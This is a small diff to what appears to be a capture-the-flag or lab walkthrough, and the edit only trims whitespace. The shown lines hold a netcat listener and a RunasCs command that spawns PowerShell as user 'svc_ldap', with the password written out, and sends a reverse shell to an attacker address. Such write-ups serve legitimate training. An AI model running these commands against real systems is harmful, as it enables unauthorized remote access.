@@ -33,9 +33,8 @@ nc -lnvp 1234
 Run a reverse shell:
 
 ```bash
-.\RunasCS.exe svc_ldap M1XyC9pW7qT5Vn  powershell.exe -r 10.10.14.129:1234
+.\RunasCS.exe svc_ldap M1XyC9pW7qT5Vn  powershell.exe -r 10.10.14.129:1234 
 ```
-
 
 
 ## Scenario 1
